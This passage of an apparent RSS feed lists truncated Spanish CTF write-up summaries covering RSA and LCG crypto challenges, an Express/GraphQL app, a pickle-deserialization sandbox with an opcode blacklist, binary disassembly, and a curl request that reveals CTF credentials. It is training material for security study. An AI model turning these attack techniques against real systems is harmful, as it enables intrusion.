use pairing_ce::{ bls12_381::{Fr, G1Affine}, ff::{Field, PrimeField}, CurveAffine, GenericCurveProjective, }; use paranormial::{Polynomial, Setup}; use primitive_types::U256; use rand::{OsRng, Rng}; use std::{ fs::File, io::Read, }; const DEGREE: usize = 256; const ALPHA: &amp;amp;str = "1337133713371337133713371337133713371337133713371337133713371337133713371337"; const NUM_POINTS: usize = 512; const PARANOMIAL_RATE: u32 = 3; fn main() { let setup_path = std::env::args().</description></item><item><title>Partial Tenacity</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/partial-tenacity/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/partial-tenacity/</guid><description>Se nos proporciona el código fuente en Python que cifra la flag:
from secret import FLAG from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP class RSACipher: def __init__(self, bits): self.key = RSA.generate(bits) self.cipher = PKCS1_OAEP.new(self.key) def encrypt(self, m): return self.cipher.encrypt(m) def decrypt(self, c): return self.cipher.decrypt(c) cipher = RSACipher(1024) enc_flag = cipher.encrypt(FLAG) with open('output.txt', 'w') as f: f.write(f'n = {cipher.key.n}\n') f.write(f'ct = {enc_flag.hex()}\n') f.write(f'p = {str(cipher.key.p)[::2]}\n') f.write(f'q = {str(cipher.key.q)[1::2]}') También tenemos la salida del script:</description></item><item><title>Passman</title><link>https://7rocky.github.io/ctf/htb-challenges/web/passman/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/passman/</guid><description>Se nos proporciona un sitio web como este:
También tenemos el código fuente en Node.js.
Análisis de código fuente La aplicación web está construida con Express JS. Un archivo relevante es routes/index.js:
const express = require('express'); const router = express.Router(); const { graphqlHTTP } = require('express-graphql'); const AuthMiddleware = require('../middleware/AuthMiddleware'); const GraphqlSchema = require('../helpers/GraphqlHelper'); router.get('/', (req, res) =&amp;gt; { return res.render('login.html'); }); router.get('/register', (req, res) =&amp;gt; { return res.render('register.html'); }); router.</description></item><item><title>Passman</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/passman/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/passman/</guid><description>Se nos proporciona un sitio web como este:
También tenemos el código fuente en Node.js.
Análisis de código fuente La aplicación web está construida con Express JS. Un archivo relevante es routes/index.js:
const express = require('express'); const router = express.Router(); const { graphqlHTTP } = require('express-graphql'); const AuthMiddleware = require('../middleware/AuthMiddleware'); const GraphqlSchema = require('../helpers/GraphqlHelper'); router.get('/', (req, res) =&amp;gt; { return res.render('login.html'); }); router.get('/register', (req, res) =&amp;gt; { return res.render('register.html'); }); router.</description></item><item><title>Path of Survival</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/path-of-survival/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/path-of-survival/</guid><description>Se nos proporciona el siguiente sitio web:
Muestra una especie de laberinto en el que somos un astronauta y necesitamos encontrar un arma en el menor tiempo posible.
El sitio web muestra cómo interactuar con nuestro jugador astronauta y muestra algunas reglas con respecto a las casillas del laberinto. (Cliff, Geyser, Mountain&amp;hellip;):
Además, tenemos una API HTTP para obtener el mapa como documento JSON y ejecutar comandos para mover el astronauta:</description></item><item><title>Peel Back The Layers</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/peel-back-the-layers/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/peel-back-the-layers/</guid><description>Tenemos esta descripción del reto:
A well known hacker rival of ours, managed to gain access to our dockehub profile and insert a backdoor to one of our public docker images in order to distribute his malware and fullfil his soul purpose, which is to destroy our steampunk robot using his steam malware. When we started tracing him back he deleted his backdoor. Can you help us retrieve his backdoor? Docker Image: steammaintainer/gearrepairimage</description></item><item><title>Percetron</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/percetron/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/percetron/</guid><description>Se nos proporciona un sitio web donde podemos registrarnos e iniciar sesión para tener este dashboard:
Además, tenemos todo el proyecto web para realizar el análisis.
Análisis del código fuente El servidor web ejecuta Express JS (Node.js). El archivo index.js es bastante estándar, pero podemos ver que usa MongoDB y neo4j:
require("dotenv").config(); const path = require("path"); const express = require("express"); const session = require("express-session"); const mongoose = require("mongoose"); const Neo4jConnection = require("</description></item><item><title>Perfect Synchronization</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/perfect-synchronization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/perfect-synchronization/</guid><description>Se nos proporciona el código fuente en Python para cifrar la flag:
from os import urandom from Crypto.Cipher import AES from secret import MESSAGE assert all([x.isupper() or x in '{_} ' for x in MESSAGE]) class Cipher: def __init__(self): self.salt = urandom(15) key = urandom(16) self.cipher = AES.new(key, AES.MODE_ECB) def encrypt(self, message): return [self.cipher.encrypt(c.encode() + self.salt) for c in message] def main(): cipher = Cipher() encrypted = cipher.encrypt(MESSAGE) encrypted = "</description></item><item><title>Personalized</title><link>https://7rocky.github.io/ctf/imaginaryctf/personalized/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/personalized/</guid><description>Se nos proporciona el código fuente en Python utilizado para cifrar la flag:
#!/usr/bin/env python3 from Crypto.Util.number import * from random import seed, getrandbits m = bytes_to_long(open('flag.txt', 'rb').read()) print("What's your name?\n&amp;gt;&amp;gt;&amp;gt; ", end='') name = open(0, 'rb').readline().strip() seed(bytes_to_long(name)) e = 2*getrandbits(32)+1 p = getPrime(512) q = getPrime(512) n = p*q c = pow(m, e, n) print(f"Here's your flag, {''.join(chr(i) for i in name)}!") print(f'{n = }') print(f'{e = }') print(f'{c = }') Utiliza una implementación de RSA en la que podemos proporcionar un nombre que será usado como semilla de un Generador de Números Pseudo-Aleatorios (PRNG, Pseudo-Random Number Generator).</description></item><item><title>Pickle</title><link>https://7rocky.github.io/ctf/imaginaryctf/pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/pickle/</guid><description>Se nos proporciona un archivo llamado out.pickle. La flag está almacenada dentro, podemos visualizar su contenido en hexadecimal:
$ xxd out.pickle 00000000: 8004 958c 0000 0000 0000 008c 085f 5f6d .............__m 00000010: 6169 6e5f 5f94 8c0b 466c 6167 5072 696e ain__...FlagPrin 00000020: 7465 7294 9394 2981 947d 9428 8c04 666c ter...)..}.(..fl 00000030: 6167 945d 9428 4b69 4b63 4b74 4b66 4b7b ag.].(KiKcKtKfK{ 00000040: 4b63 4b75 4b63 4b75 4b6d 4b62 4b65 4b72 KcKuKcKuKmKbKeKr 00000050: 4b73 4b5f 4b6f 4b72 4b5f 4b70 4b69 4b63 KsK_KoKrK_KpKiKc 00000060: 4b6b 4b6c 4b65 4b73 4b3f 4b7d 658c 0466 KkKlKeKsK?</description></item><item><title>Pickle Panic</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/pickle-panic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/pickle-panic/</guid><description>Se nos proporciona este script en Python que se ejecuta en la instancia remota:
#!/usr/bin/env python3 import pickle import pickletools import io import sys BLACKLIST_OPCODES = { "BUILD", "SETITEM", "SETITEMS", "DICT", "EMPTY_DICT", "INST", "OBJ", "NEWOBJ", "EXT1", "EXT2", "EXT4", "EMPTY_SET", "ADDITEMS", "FROZENSET", "NEWOBJ_EX", "FRAME", "BYTEARRAY8", "NEXT_BUFFER", "READONLY_BUFFER", } module = type(__builtins__) empty = module("empty") sys.modules["empty"] = empty class MyUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == "empty" and name.count(".") &amp;lt;= 1 and "</description></item><item><title>PICtureThis</title><link>https://7rocky.github.io/ctf/other/hackon-ctf/picturethis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackon-ctf/picturethis/</guid><description>En este reto nos dan un Windows PE llamado main.exe y una DLL cifrada (ciphered.dll):
$ file * ciphered.dll: data main.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows Análisis de main.exe De momento, podemos comenzar por abrir main.exe en Ghidra y mirar las strings. Rápidamente vemos una que indica cómo se tiene que ejecutar el programa main.exe:
Funcionamiento: ./reto.exe &amp;lt;input_string&amp;gt; Si buscamos por referencias a esta string, llegaremos a la función principal:</description></item><item><title>PIN</title><link>https://7rocky.github.io/ctf/ctflearn/reverse-engineering/pin/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/reverse-engineering/pin/</guid><description>Se nos proporciona un binario llamado rev1:
$ file rev1 rev1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c5f9af621b132c2028d8e689cbb5b707f3f3cd28, not stripped Si lo ejecutamos, el programa espera un PIN:
$ ./rev1 Masukan PIN = 1234 PIN salah ! Vamos a depurarlo con GDB y a mostrar el código ensamblador del main:
$ gdb -q rev1 Reading symbols from rev1... (No debugging symbols found in rev1) gef➤ disassemble main Dump of assembler code for function main: 0x00000000004005d6 &amp;lt;+0&amp;gt;: push rbp 0x00000000004005d7 &amp;lt;+1&amp;gt;: mov rbp,rsp 0x00000000004005da &amp;lt;+4&amp;gt;: sub rsp,0x10 0x00000000004005de &amp;lt;+8&amp;gt;: lea rdi,[rip+0xdf] # 0x4006c4 0x00000000004005e5 &amp;lt;+15&amp;gt;: mov eax,0x0 0x00000000004005ea &amp;lt;+20&amp;gt;: call 0x4004a0 &amp;lt;printf@plt&amp;gt; 0x00000000004005ef &amp;lt;+25&amp;gt;: lea rax,[rbp-0x4] 0x00000000004005f3 &amp;lt;+29&amp;gt;: mov rsi,rax 0x00000000004005f6 &amp;lt;+32&amp;gt;: lea rdi,[rip+0xd6] # 0x4006d3 0x00000000004005fd &amp;lt;+39&amp;gt;: mov eax,0x0 0x0000000000400602 &amp;lt;+44&amp;gt;: call 0x4004b0 &amp;lt;__isoc99_scanf@plt&amp;gt; 0x0000000000400607 &amp;lt;+49&amp;gt;: mov eax,DWORD PTR [rbp-0x4] 0x000000000040060a &amp;lt;+52&amp;gt;: mov edi,eax 0x000000000040060c &amp;lt;+54&amp;gt;: call 0x4005b6 &amp;lt;cek&amp;gt; 0x0000000000400611 &amp;lt;+59&amp;gt;: test eax,eax 0x0000000000400613 &amp;lt;+61&amp;gt;: je 0x400623 &amp;lt;main+77&amp;gt; 0x0000000000400615 &amp;lt;+63&amp;gt;: lea rdi,[rip+0xba] # 0x4006d6 0x000000000040061c &amp;lt;+70&amp;gt;: call 0x400490 &amp;lt;puts@plt&amp;gt; 0x0000000000400621 &amp;lt;+75&amp;gt;: jmp 0x40062f &amp;lt;main+89&amp;gt; 0x0000000000400623 &amp;lt;+77&amp;gt;: lea rdi,[rip+0xba] # 0x4006e4 0x000000000040062a &amp;lt;+84&amp;gt;: call 0x400490 &amp;lt;puts@plt&amp;gt; 0x000000000040062f &amp;lt;+89&amp;gt;: mov eax,0x0 0x0000000000400634 &amp;lt;+94&amp;gt;: leave 0x0000000000400635 &amp;lt;+95&amp;gt;: ret End of assembler dump.</description></item><item><title>Pinned</title><link>https://7rocky.github.io/ctf/htb-challenges/mobile/pinned/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/mobile/pinned/</guid><description>Se nos proporciona un archivo APK (pinned.apk) y un archivo README.txt:
1. Install this application in an API Level 29 or earlier (i.e. Android 10.0 (Google APIs)). Análisis dinámico Vamos a arrancar MobSF y Genymotion hacer un análisis dinámico:
Simplemente muestra un formulario de inicio de sesión con las credenciales ya escritas. No pude leer la contraseña desde ahí. Si pinchamos en el botón, veremos un mensaje exitoso:
Resolviendo el reto El reto probablemente esté relacionado con certificate pinning en SSL/TLS (porque el reto se llama &amp;ldquo;Pinned&amp;rdquo;).</description></item><item><title>plai_n_rsa</title><link>https://7rocky.github.io/ctf/other/seccon-ctf/plai_n_rsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/seccon-ctf/plai_n_rsa/</guid><description>Se nos proporciona el código fuente de Python para cifrar la flag:
import os from Crypto.Util.number import bytes_to_long, getPrime flag = os.getenvb(b"FLAG", b"SECCON{THIS_IS_FAKE}") assert flag.startswith(b"SECCON{") m = bytes_to_long(flag) e = 0x10001 p = getPrime(1024) q = getPrime(1024) n = p * q e = 65537 phi = (p-1)*(q-1) d = pow(e, -1, phi) hint = p+q c = pow(m,e,n) print(f"e={e}") print(f"d={d}") print(f"hint={hint}") print(f"c={c}") Y la salida del script:
e=65537 d=15353693384417089838724462548624665131984541847837698089157240133474013117762978616666693401860905655963327632448623455383380954863892476195097282728814827543900228088193570410336161860174277615946002137912428944732371746227020712674976297289176836843640091584337495338101474604288961147324379580088173382908779460843227208627086880126290639711592345543346940221730622306467346257744243136122427524303881976859137700891744052274657401050973668524557242083584193692826433940069148960314888969312277717419260452255851900683129483765765679159138030020213831221144899328188412603141096814132194067023700444075607645059793 hint=275283221549738046345918168846641811313380618998221352140350570432714307281165805636851656302966169945585002477544100664479545771828799856955454062819317543203364336967894150765237798162853443692451109345096413650403488959887587524671632723079836454946011490118632739774018505384238035279207770245283729785148 c=8886475661097818039066941589615421186081120873494216719709365309402150643930242604194319283606485508450705024002429584410440203415990175581398430415621156767275792997271367757163480361466096219943197979148150607711332505026324163525477415452796059295609690271141521528116799770835194738989305897474856228866459232100638048610347607923061496926398910241473920007677045790186229028825033878826280815810993961703594770572708574523213733640930273501406675234173813473008872562157659306181281292203417508382016007143058555525203094236927290804729068748715105735023514403359232769760857994195163746288848235503985114734813 El servidor usa RSA para cifrar la flag.</description></item><item><title>PolyLCG</title><link>https://7rocky.github.io/ctf/other/securinets-ctf/polylcg/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/securinets-ctf/polylcg/</guid><description>Se nos proporciona el código fuente en Python para cifrar la flag:
from random import randint xcoeff=[2220881165502059873403292638352563283672047788097000474246472547036149880673794935190953317495413822516051735501183996484673938426874803787946897055911986,3780868071235160215367199770952656972709510983146503211692869296836254519620768737356081836837102329626660962468333562050121427935761471039362287802941597,4902413424318450578332022710023815992030030940432088134156375736636296016273860394626141407089100644225364129305706233708267009976783719598126300552264686] ycoeff=[10133630993576627916260025550504106878405253409844193620608338129978685236278362029266353690006955194818074387390350472504283291952199370441443295790407675,3364000239596805500788439152587586988694473612770420810400457954622820421525205173981972752548906690775960238564395459369815397933405749174182967563999094, 5184466564604150683447715719961919989718796968566745874607480183961791804239357212974694797397047787503590843234526492414458478882622032364603797888695699] p=10369539704979520345376943788090457296701518777268113122376443474930073612795297691185597789473973789467303121639140064504782927997022419913721978857764263 class LCG: def __init__(self,p,xcoeffs,ycoeffs): self.p=p self.xcoeffs=xcoeffs self.ycoeffs=ycoeffs self.xstate =randint(1,p-1) self.ystate =randint(1,p-1) for i in range(randint(1,1337)): self.next() def next(self): self.xstate=pow(self.xcoeffs[0]+self.xcoeffs[1]*self.xstate+self.xcoeffs[2]*self.xstate**2,1,self.p) self.ystate=pow(self.ycoeffs[0]+self.ycoeffs[1]*self.ystate+self.ycoeffs[2]*self.ystate**2,1,self.p) def encrypt(self,msg): bin_msg=list(map(int, list(f"{msg:0512b}"))) encrypted=[] for i in bin_msg: self.next() if i==1: encrypted.append(self.xstate) else: encrypted.append(self.ystate) return encrypted flag=b"Securinets{???????????????????????????????????????}" flag=int.from_bytes(flag,"big") lcgCipher=LCG(p,xcoeff,ycoeff) encrypted_flag=lcgCipher.encrypt(flag) print("encrypted_flag=",encrypted_flag) Además, tenemos la salida del programa como output.txt:</description></item><item><title>POOF</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/poof/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/poof/</guid><description>Se nos proporcionan algunos archivos:
$ unzip -l POOF.zip Archive: POOF.zip Length Date Time Name ---------- ---------- ----- ---- 2567089 10-20-2022 11:12 candy_dungeon.pdf.boo 1096901984 10-20-2022 18:11 mem.dmp 7822474 10-20-2022 11:25 poof_capture.pcap 1126698 10-20-2022 12:04 Ubuntu_4.15.0-184-generic_profile.zip ---------- ------- 1108435601 4 files Y tenemos una instancia remota a la que conectarnos para responder a algunas preguntas:
$ nc 159.65.48.79 31240 +-------+-----------------------------------------------------+ | Title | Description | +-------+-----------------------------------------------------+ | POOF | In my company, we are developing a | | | new python game for Halloween.</description></item><item><title>POOF</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/poof/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/poof/</guid><description>Se nos proporcionan algunos archivos:
$ unzip -l forensics_poof.zip Archive: forensics_poof.zip Length Date Time Name ---------- ---------- ----- ---- 2567089 10-20-2022 11:12 candy_dungeon.pdf.boo 1096901984 10-20-2022 18:11 mem.dmp 7839830 10-20-2022 11:25 poof_capture.pcap 1126698 10-20-2022 12:04 Ubuntu_4.15.0-184-generic_profile.zip ---------- ------- 1108435601 4 files Y tenemos una instancia remota a la que conectarnos para responder a algunas preguntas:
$ nc 159.65.48.79 31240 +-------+-----------------------------------------------------+ | Title | Description | +-------+-----------------------------------------------------+ | POOF | In my company, we are developing a | | | new python game for Halloween.</description></item><item><title>Poor Login</title><link>https://7rocky.github.io/ctf/ctflearn/binary/poor-login/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/binary/poor-login/</guid><description>Se nos proporciona un binario de 64 bits llamado login:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled También tenemos el código fuente en C:
#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; int menu() { printf("*** WINBLOWS LOGIN *********\n" "1. Login into user.\n" "2. Sign out.\n" "3. Print flag.\n" "4. Lock user.\n" "5. Restore user.\n" "&amp;gt; "); int resp = 0; scanf("%d", &amp;amp;resp); while (getchar() !</description></item><item><title>POST Practice</title><link>https://7rocky.github.io/ctf/ctflearn/web/post-practice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/web/post-practice/</guid><description>El reto pide que nos autentiquemos en una URL dada mediante una petición POST.
Primero de todo, vamos a realizar una petición GET para ver si nos dan las credenciales, utilizando curl:
$ curl http://165.227.106.113/post.php &amp;lt;h1%gt;This site takes POST data that you have not submitted!&amp;lt;/h1&amp;gt;&amp;lt;!-- username: admin | password: 71urlkufpsdnlkadsf --&amp;gt; Y aquí las tenemos. Ahora solamente tenemos que usar una petición POST con esta información. Si usamos -d en curl para poner el cuerpo de la petición, el método de la petición se pone por defecto en POST, por lo que no es necesario indicar -X POST:</description></item><item><title>Potion Master</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/potion-master/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/potion-master/</guid><description>Se nos proporciona un script en Haskell llamado potion.hs:
import Data.Char (ord) import Data.Bits (xor) -- Complete the incantation... flag = "HTB{XXX}" extractFlag :: String -&amp;gt; String extractFlag (s:rest) | s == 'H' || s == 'T' || s == 'B' = extractFlag rest | s == '{' &amp;&amp; last rest == '}' = init rest | otherwise = error ("Invalid format") chunks :: Int -&amp;gt; [a] -&amp;gt; [[a]] chunks n l | n == 0 = [] | n == 1 = [[x] | x &amp;lt;- l] | length l &amp;lt;= n = [l] | otherwise = [take n l] ++ (chunks n (drop n l)) takeLast :: Int -&amp;gt; [a] -&amp;gt; [a] takeLast n = reverse .</description></item><item><title>Potion Master</title><link>https://7rocky.github.io/ctf/other/htb-unictf/potion-master/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/potion-master/</guid><description>Se nos proporciona un script en Haskell llamado potion.hs:
import Data.Char (ord) import Data.Bits (xor) -- Complete the incantation... flag = "HTB{XXX}" extractFlag :: String -&amp;gt; String extractFlag (s:rest) | s == 'H' || s == 'T' || s == 'B' = extractFlag rest | s == '{' &amp;&amp; last rest == '}' = init rest | otherwise = error ("Invalid format") chunks :: Int -&amp;gt; [a] -&amp;gt; [[a]] chunks n l | n == 0 = [] | n == 1 = [[x] | x &amp;lt;- l] | length l &amp;lt;= n = [l] | otherwise = [take n l] ++ (chunks n (drop n l)) takeLast :: Int -&amp;gt; [a] -&amp;gt; [a] takeLast n = reverse .</description></item><item><title>pqqp</title><link>https://7rocky.github.io/ctf/imaginaryctf/pqqp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/pqqp/</guid><description>Se nos proporciona este código en Python que cifra la flag:
from Crypto.Util.number import * p = getPrime(1024) q = getPrime(1024) n = p * q e = 65537 m = bytes_to_long(open("flag.txt", "rb").read().strip()) c = pow(m, e, n) pqqp = (pow(p, q, n) + pow(q, p, n)) % n print(f"{n = }") print(f"{e = }") print(f"{c = }") print(f"{pqqp = }") Y tenemos el archivo output.txt:
n = 19678109133542698592305708016218863883460540049917712329432013892172528110292745184992950044286234053071380305255840348326164548510255147118470308166391801316954651278311516797693549738950638924838729113122082201649970553380521265027078990142823602788816122841173521655481024888439982252740049512798598085061773695717897738054691150959372485365062487195925100664710335322057804378500514036943988819273662050112952925141139754952427282840502980857190361170607335143494354546987865462698409956206631411308141753183566771545343693446609738596094372008339052131415140340456565555396933183573996686236769224009352680776141 e = 65537 c = 4072247787644405517693225466780406787448185227848467266590680538951503737695652776519815815044794587161578707809819763441075707137469351267404539758695849074266727221320662086207093016080297854717488042255308770890593983978724257303414642859978484084458380098954259220304333391581145689059564973907676661078965777905977665249069877734867259119271333543347675967002480182290529431802723432351160734165536930587939120516653618367482414081000718254774375447568464759357446892747598177493342245946293460645987948522541784101210339329312458616738544161953857715180345325332187115407714964472659039920532267119264418919947 pqqp = 286274681617083968101800572253589724107707315933733496895870570711787172051691156975540599189839527166581986519156360694553593020374681020209511667035419131460916677948315029070571749042370272329205309015536090768801019566664262350433731622252363771741528214379501493482631649996976367966453784254842455722642 En primer lugar, tenemos que expresar $p^q + q^p \mod{n}$ de otra manera.</description></item><item><title>Practice Flag</title><link>https://7rocky.github.io/ctf/ctflearn/miscellaneous/practice-flag/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/miscellaneous/practice-flag/</guid><description>Este reto es solamente una introducción. La flag se muestra directamente: CTFlearn{4m_1_4_r3al_h4ck3r_y3t}.</description></item><item><title>Prime</title><link>https://7rocky.github.io/ctf/other/balsn-ctf/prime/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/balsn-ctf/prime/</guid><description>Se nos proporciona el código fuente del servidor en SageMath:
import gmpy2 import random from secret import FLAG def main(): n = int(input("prime: ")) if n &amp;lt;= 0: print("No mystiz trick") elif n.bit_length() &amp;lt; 256 or n.bit_length() &amp;gt; 512: print("Not in range") elif not is_prime(n): print("Not prime") else: x = int(input("factor: ")) if x &amp;gt; 1 and x &amp;lt; n and n % x == 0: print("You got me") print(FLAG) else: print("</description></item><item><title>Pumpkin Stand</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/pumpkin-stand/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/pumpkin-stand/</guid><description>Se nos proporciona un binario de 64 bits llamado pumpkin_stand:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Ingeniería inversa Si abrimos el binario en Ghidra, veremos el código descompilado en C de la función main:
void main() { long in_FS_OFFSET; short option; short amount; FILE *fp; undefined8 local_48; undefined8 local_40; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; undefined8 canary; canary = *(undefined8 *) (in_FS_OFFSET + 0x28); setup(); banner(); option = 0; amount = 0; while (true) { while (true) { while (true) { while (true) { menu(); __isoc99_scanf("</description></item><item><title>Pumpking</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/pumpking/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/pumpking/</guid><description>Se nos proporciona un binario de 64 bits llamado pumpking:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Configuración del entorno Puede ocurrir que no tengamos la versión de Glibc que acepta el programa:
$ ./pumpking zsh: no such file or directory: ./pumpking $ ldd pumpking ./pumpking: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./pumpking) linux-vdso.so.1 (0x00007ffc78fd6000) libseccomp.so.2 =&amp;gt; /lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007f16439e4000) libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.</description></item><item><title>PumpkinSpice</title><link>https://7rocky.github.io/ctf/htb-challenges/web/pumpkinspice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/pumpkinspice/</guid><description>Se nos proporciona el siguiente sitio web:
También disponemos el código fuente en Python del servidor (Flask).
Análisis del código fuente El archivo relevante es app.py:
import string, time, subprocess from flask import Flask, request, render_template, abort from threading import Thread app = Flask(__name__) addresses = [] def start_bot(): from selenium import webdriver from selenium.webdriver.chrome.options import Options from selenium.webdriver.chrome.service import Service from selenium.webdriver.support.ui import WebDriverWait host, port = "localhost", 1337 HOST = f"</description></item><item><title>Pusheen Loves Graphs</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/pusheen-loves-graphs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/pusheen-loves-graphs/</guid><description>Se nos proporciona un archivo binario llamado Pusheen. Si lo ejecutamos, veremos un dibujo de un gato:
$ ./Pusheen ▐▀▄ ▄▀▌ ▄▄▄▄▄▄▄ ▌▒▒▀▄▄▄▄▀▒▒▐▄▀▀▒██▒██▒▀▀▄ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄ ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▄▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄ ▀█▒▒█▌▒▒█▒▒▐█▒▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌ ▀▌▒▒▒▒▒▀▒▀▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐ ▄▄ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌▄█▒█ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▒█▀ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▀ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌ ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌ ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐ ▐▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▌ ▀▄▄▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀ Si miramos las cadenas de caracteres imprimibles, vemos que hay muchas que empiezan por e_ (de hecho, hay desde e_0_0 hasta e_66_100). Podemos contarlas de esta manera:
$ strings Pusheen | wc -l 6767 Estas cadenas de caracteres pueden ser nombres de funciones, ya que el binario no ha sido despojado de sus símbolos:</description></item><item><title>Put a ring on it</title><link>https://7rocky.github.io/ctf/other/ecsc-2023/put-a-ring-on-it/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/ecsc-2023/put-a-ring-on-it/</guid><description>Ring Signatures are used in some cryptocurrencies to provide anonymity for who has signed a transaction or sent money. Can you break the anonymity of the ring signatures?
Challenge contributed by CryptoHack
Challenge files:
